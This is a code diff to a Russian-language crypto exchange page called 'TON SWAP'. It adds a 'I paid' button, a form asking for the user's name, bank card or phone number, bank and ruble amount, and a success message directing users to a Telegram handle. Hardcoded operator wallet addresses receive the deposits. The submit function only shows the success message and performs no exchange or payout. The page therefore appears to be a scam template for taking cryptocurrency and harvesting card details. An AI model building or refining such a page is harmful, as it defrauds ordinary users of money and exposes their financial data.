@@ -21,10 +21,14 @@ select:focus, input:focus { border-color: #f0b90b; }
 .rate-info { background: #2b3139; padding: 12px; border-radius: 8px; font-size: 13px; color: #b7bdc6; margin-bottom: 20px; display: flex; justify-content: space-between; }
 .btn { width: 100%; padding: 14px; background: #f0b90b; border: none; border-radius: 8px; color: #0b0e11; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; }
 .btn:hover { background: #d9a400; }
+.btn-green { background: #0ecb81; color: #0b0e11; margin-top: 15px; }
+.btn-green:hover { background: #0aa76a; }
 .result { display: none; margin-top: 25px; background: #2b3139; border-radius: 8px; padding: 20px; font-size: 14px; }
 .result.show { display: block; }
 .result .addr { background: #0b0e11; padding: 12px; border-radius: 6px; margin: 10px 0; word-break: break-all; color: #f0b90b; font-family: monospace; font-size: 13px; }
 .warning { color: #f6465d; font-size: 12px; margin-top: 15px; }
+.success-msg { display: none; margin-top: 20px; background: #0ecb81; color: #0b0e11; padding: 15px; border-radius: 8px; font-size: 14px; font-weight: 600; }
+.success-msg.show { display: block; }
 footer { margin-top: auto; text-align: center; padding: 20px; color: #5e6673; font-size: 12px; border-top: 1px solid #2b3139; }
 .status-bar { display: flex; gap: 10px; align-items: center; font-size: 12px; color: #0ecb81; margin-bottom: 20px; }
 .status-bar .dot { width: 8px; height: 8px; background: #0ecb81; border-radius: 50%; }
@@ -46,6 +50,9 @@ footer { margin-top: auto; text-align: center; padding: 20px; color: #5e6673; fo
 <span class="dot"></span>
 <span>Все системы работают. Онлайн-обмен доступен 24/7.</span>
 </div>
+
+<!-- ФОРМА ОБМЕНА -->
+<div id="exchangeForm">
 <div class="form-group">
 <label>Отдаю</label>
 <select id="fromCurrency">
@@ -70,25 +77,61 @@ footer { margin-top: auto; text-align: center; padding: 20px; color: #5e6673; fo
 <span>Комиссия: <b>0%</b></span>
 </div>
 <button class="btn" onclick="calculate()">Обменять</button>
+</div>
+
+<!-- РЕЗУЛЬТАТ: АДРЕС И КНОПКА "Я ОПЛАТИЛ" -->
 <div class="result" id="result">
 <p>✅ Заявка создана. Переведите <b id="payAmount">0</b> <span id="payCur">TON</span> на адрес:</p>
 <div class="addr" id="walletAddr">UQCdkAxf20UIMaboXOfSpmNTkFSVguTVHIw2PMSOhEkF6SuH</div>
-<p>После перевода нажмите кнопку «Проверить оплату» в боте или напишите в поддержку.</p>
+<p>После перевода нажмите кнопку ниже:</p>
+<button class="btn btn-green" onclick="showPaymentForm()">✅ Я оплатил</button>
 <p class="warning">⚠️ Внимание: переводы с санкционных бирж запрещены.</p>
 </div>
+
+<!-- ФОРМА РЕКВИЗИТОВ (ПОЯВЛЯЕТСЯ ПОСЛЕ "Я ОПЛАТИЛ") -->
+<div class="result" id="paymentForm" style="display:none;">
+<p>📝 Заполните данные для получения рублей:</p>
+<div class="form-group">
+<label>Ваше имя</label>
+<input type="text" id="userName" placeholder="Иван Иванов">
+</div>
+<div class="form-group">
+<label>Номер карты или телефон (СБП)</label>
+<input type="text" id="userCard" placeholder="2200 0000 0000 0000">
+</div>
+<div class="form-group">
+<label>Банк</label>
+<input type="text" id="userBank" placeholder="Сбербанк / Тинькофф / Альфа">
+</div>
+<div class="form-group">
+<label>Сумма к получению (RUB)</label>
+<input type="text" id="userAmount" placeholder="250 000">
+</div>
+<button class="btn btn-green" onclick="submitPayment()">Отправить заявку</button>
+</div>
+
+<!-- СООБЩЕНИЕ УСПЕХА -->
+<div class="success-msg" id="successMsg">
+✅ Заявка принята! Для ускорения обработки напишите в поддержку: <b>@Frycrycry</b>
+</div>
+
 </div>
 <footer>
 © 2026 TON SWAP. Все права защищены.
 </footer>
+
 <script>
 // ===== ТВОИ АДРЕСА =====
 const WALLETS = {
-  TON:  "UQCdkAxf20UIMaboXOfSpmNTkFSVguTVHIw2PMSOhEkF6SuH", // TON
-  USDT: "TT4FuAXpXQjVXYqXuXojbhedYsW3WwZQq1",                 // USDT TRC20
-  ETH:  "0xe16aea126c8Aa4B97eeD2BEf4315956E1840373B"          // ETH / USDT ERC20
+  TON:  "UQCdkAxf20UIMaboXOfSpmNTkFSVguTVHIw2PMSOhEkF6SuH",
+  USDT: "TT4FuAXpXQjVXYqXuXojbhedYsW3WwZQq1",
+  ETH:  "0xe16aea126c8Aa4B97eeD2BEf4315956E1840373B"
 };
 
-// КУРСЫ (МОЖНО МЕНЯТЬ)
+// ===== ТВОЙ TELEGRAM ДЛЯ ПОДДЕРЖКИ =====
+const SUPPORT = "@Frycrycry";
+
+// КУРСЫ
 const rates = { TON: 250, USDT: 95, ETH: 250000 };
 
 function updateRate() {
@@ -111,6 +154,26 @@ function calculate() {
   document.getElementById('walletAddr').innerText = WALLETS[from] || WALLETS.TON;
   document.getElementById('result').classList.add('show');
   document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
+}
+
+function showPaymentForm() {
+  document.getElementById('paymentForm').style.display = 'block';
+  document.getElementById('paymentForm').scrollIntoView({ behavior: 'smooth' });
+}
+
+function submitPayment() {
+  const name = document.getElementById('userName').value;
+  const card = document.getElementById('userCard').value;
+  const bank = document.getElementById('userBank').value;
+  const amount = document.getElementById('userAmount').value;
+
+  if (!name || !card || !bank || !amount) {
+    alert('Заполните все поля!');
+    return;
+  }
+
+  document.getElementById('successMsg').classList.add('show');
+  document.getElementById('successMsg').scrollIntoView({ behavior: 'smooth' });
 }
 </script>
 </body>
